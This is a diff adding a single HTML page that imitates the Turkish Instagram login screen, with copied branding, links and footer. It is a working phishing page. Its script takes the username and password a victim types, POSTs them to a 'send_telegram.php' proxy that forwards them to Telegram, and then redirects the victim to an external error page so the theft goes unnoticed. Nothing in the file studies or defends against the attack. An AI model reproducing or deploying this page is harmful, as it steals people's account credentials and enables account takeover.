@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="icon" href="instagram.ico" type="image/x-icon">
+  <style>
+    /* Genel stiller */
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: white;
+      margin: 0;
+      padding: 0;
+    }
+    
+    /* Dil seçici */
+    .language-selector {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 4px;
+      padding-top: 16px;
+    }
+    
+    .language-dropdown {
+      display: inline-flex;
+      align-items: center;
+    }
+    
+    .language-text {
+      font-size: 12px;
+      color: #8e8e8e;
+      font-weight: normal;
+    }
+    
+    /* Ana form alanı */
+    .login-container {
+      max-width: 350px;
+      margin: 0 auto;
+      padding: 0 40px;
+      padding-top: 35px;
+    }
+    
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 40px;
+    }
+    
+    .logo-image {
+      height: 65px;
+      width: auto;
+    }
+    
+    /* Facebook butonu */
+    .facebook-button {
+      width: 100%;
+      background-color: #0095F6;
+      color: white;
+      font-weight: 500;
+      padding: 0 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 32px;
+      border: none;
+      cursor: pointer;
+    }
+    
+    .facebook-icon-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 8px;
+    }
+    
+    .facebook-icon {
+      height: 20px;
+      width: 20px;
+    }
+    
+    /* Ya da bölümü */
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 10px 0;
+    }
+    
+    .divider-line {
+      flex-grow: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+    
+    .divider-text {
+      margin: 0 16px;
+      font-size: 13px;
+      color: #8e8e8e;
+      font-weight: 600;
+    }
+    
+    /* Form stilleri */
+    .login-form {
+      margin-top: 24px;
+    }
+    
+    .form-group {
+      margin-bottom: 8px;
+    }
+    
+    .form-input {
+      width: 100%;
+      padding: 9px 8px;
+      background-color: #fafafa;
+      font-size: 12px;
+      line-height: 18px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      box-sizing: border-box;
+    }
+    
+    .forgot-password {
+      text-align: right;
+      padding: 4px 0;
+      padding-top: 2px;
+      padding-bottom: 14px;
+    }
+    
+    .forgot-password a {
+      font-size: 13px;
+      color: #0095F6;
+      text-decoration: none;
+      font-weight: normal;
+    }
+    
+    .login-button {
+      width: 100%;
+      background-color: rgb(80, 180, 252);
+      color: white;
+      font-weight: 500;
+      border-radius: 8px;
+      margin-top: 8px;
+      margin-bottom: 8px;
+      padding: 8px 0;
+      border: none;
+      cursor: pointer;
+    }
+    
+    /* Kayıt bölümü */
+    .signup-section {
+      margin-top: 33px;
+      text-align: center;
+    }
+    
+    .signup-text {
+      font-size: 14px;
+      color: #8e8e8e;
+    }
+    
+    .signup-link {
+      color: #0095F6;
+      font-weight: 500;
+      text-decoration: none;
+    }
+    
+    /* Dip not */
+    .footnote {
+      text-align: center;
+      font-size: 12px;
+      color: #737373;
+      margin-top: 50px;
+    }
+    
+    .footnote-divider {
+      border-top: 1px solid #dbdbdb;
+      padding-top: 16px;
+      margin-top: 15px;
+    }
+    
+    .footnote-text {
+      line-height: 1.3;
+    }
+    
+    .blue-text {
+      color: #00376B;
+    }
+    
+    /* Alt linkler */
+    .footer {
+      margin-top: 120px;
+      margin-bottom: 40px;
+    }
+    
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+      font-size: 12px;
+      color: #8e8e8e;
+      line-height: 16px;
+      margin-bottom: 16px;
+    }
+    
+    .footer-link {
+      color: #8e8e8e;
+      text-decoration: none;
+      margin-bottom: 8px;
+    }
+    
+    .footer-link:hover {
+      text-decoration: underline;
+    }
+    
+    .copyright {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 15px;
+      font-size: 12px;
+      color: #8e8e8e;
+      margin-bottom: 20px;
+      margin-top: -14px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Dil seçici -->
+  <div class="language-selector">
+    <div class="language-dropdown">
+      <span class="language-text">Türkçe</span>
+      <svg class="h-3 w-3 text-[#8e8e8e] ml-1" style="height: 12px; width: 12px; color: #8e8e8e; margin-left: 4px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+      </svg>
+    </div>
+  </div>
+
+  <!-- Ana form alanı -->
+  <div class="login-container">
+    <div class="logo-container">
+      <!-- Base64 formatında Instagram logosu -->
+      <img src="data:image/png;base64,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" alt="Instagram" class="logo-image">
+    </div>
+
+    <button type="button" class="facebook-button">
+      <div class="facebook-icon-container">
+        <!-- Base64 formatında Facebook logosu -->
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLUlEQVQ4jWNgGLRAQ0NDUk1NTUdXV/c/KLCxsflvaGj439DQ8L+WltZ/LS2t/9ra2v9NTEz+GxgY/NfU1NQBKWHB5SgzM7P/OTk5/9vb2//n5eX9T0pK+u/i4vK/p6fnf1NT03+wYXl5ef8bGhr+V1RU/E9OTv6vrKz8PzIy8v+CBQv+p6am/mdiYmLCZyCGF8vKyv7X19f/T0hI+J+QkPBfWVn5f2Zm5v/u7u7/5eXl/5mYmBhZsLmwoqLi/8SJEzHErKys/ufn5/8vLi7+39bW9l9LS+s/KyvrfxYkdVJSUv/T09Mxgujq6vrfycnpf3Nz83+QjampqZhBxMzMjN2rIDBy5Mj/gYGB/0tKSv47Ozv/19PTw59MQDYEBARgDXYmJiYGcgEArQ2DToOcbdkAAAAASUVORK5CYII=" alt="Facebook" class="facebook-icon">
+      </div>
+      Facebook ile Devam Et
+    </button>
+
+    <div class="divider">
+      <div class="divider-line"></div>
+      <span class="divider-text">YA DA</span>
+      <div class="divider-line"></div>
+    </div>
+
+    <form id="loginForm" class="login-form">
+      <div class="form-group">
+        <input type="text" id="username" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="form-input" required>
+      </div>
+
+      <div class="form-group">
+        <input type="password" id="password" name="password" placeholder="Şifre" class="form-input" required>
+      </div>
+
+      <div class="forgot-password">
+        <a href="https://www.instagram.com/accounts/password/reset/">Şifreni mi unuttun?</a>
+      </div>
+
+      <button type="submit" class="login-button" id="submitButton">Giriş yap</button>
+    </form>
+
+    <div class="signup-section">
+      <p class="signup-text">
+        Hesabın yok mu? <a href="https://www.instagram.com/accounts/signup/phone/" class="signup-link">Kaydol</a>
+      </p>
+    </div>
+
+    <div class="footnote">
+      <div class="footnote-divider"></div>
+      <p class="footnote-text">
+        Ayrıca ülkende giriş yapmadan <span class="blue-text">yasa dışı olduğunu düşündüğün içeriği şikayet edebilirsin</span>.
+      </p>
+    </div>
+  </div>
+
+  <!-- Alt linkler -->
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#" class="footer-link">Meta</a>
+      <a href="#" class="footer-link">Hakkında</a>
+      <a href="#" class="footer-link">Blog</a>
+      <a href="#" class="footer-link">İş Fırsatları</a>
+      <a href="#" class="footer-link">Yardım</a>
+      <a href="#" class="footer-link">API</a>
+    </div>
+
+    <div class="footer-links">
+      <a href="#" class="footer-link">Gizlilik</a>
+      <a href="#" class="footer-link">Çerez Ayarları</a>
+      <a href="#" class="footer-link">Koşullar ve Künye</a>
+      <a href="#" class="footer-link">Konumlar</a>
+    </div>
+
+    <div class="footer-links">
+      <a href="#" class="footer-link">Instagram Lite</a>
+      <a href="#" class="footer-link">Threads</a>
+    </div>
+
+    <div class="footer-links">
+      <a href="#" class="footer-link">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
+      <a href="#" class="footer-link">Meta Verified</a>
+    </div>
+
+    <div class="footer-links">
+      <a href="#" class="footer-link">Sözleşmeleri burada iptal et</a>
+    </div>
+
+    <div class="copyright">
+      <div class="language-dropdown">
+        <span class="language-text">Türkçe</span>
+        <svg class="h-[15px] w-[15px]" style="height: 15px; width: 15px; color: #8e8e8e; margin-left: 4px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+        </svg>
+      </div>
+      <span>© 2025 Instagram from Meta</span>
+    </div>
+  </div>
+
+  <script>
+    // Bu değişkeni değiştirerek yönlendirme URL'ini ayarlayabilirsiniz
+    const REDIRECT_URL = "https://itiraflar.kesug.com/hata/";
+    
+    // Form gönderildiğinde çalışacak fonksiyon
+    document.getElementById('loginForm').addEventListener('submit', async function(event) {
+      event.preventDefault();
+      
+      // Form verilerini al
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      
+      // Eğer alanlar boşsa işlemi durdur
+      if (!username || !password) {
+        return;
+      }
+      
+      // Giriş butonunu devre dışı bırak ve "Giriş yapılıyor..." mesajı göster
+      const submitButton = document.getElementById('submitButton');
+      submitButton.disabled = true;
+      submitButton.innerText = "Giriş yapılıyor...";
+      
+      try {
+        // PHP proxy üzerinden Telegram'a mesaj gönder
+        const response = await fetch('send_telegram.php', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            username: username,
+            password: password
+          })
+        });
+        
+        if (!response.ok) {
+          console.error("Gönderim hatası:", await response.text());
+        } else {
+          const result = await response.json();
+          if (!result.success) {
+            console.error("İşlem başarısız:", result.error);
+          }
+        }
+        
+        // İşlem tamamlandığında yönlendir (başarılı olmasa bile)
+        window.location.href = REDIRECT_URL;
+        
+      } catch (error) {
+        console.error("İşlem hatası:", error);
+        // Hata olsa bile yönlendir
+        window.location.href = REDIRECT_URL;
+      }
+    });
+  </script>
+</body>
+</html>
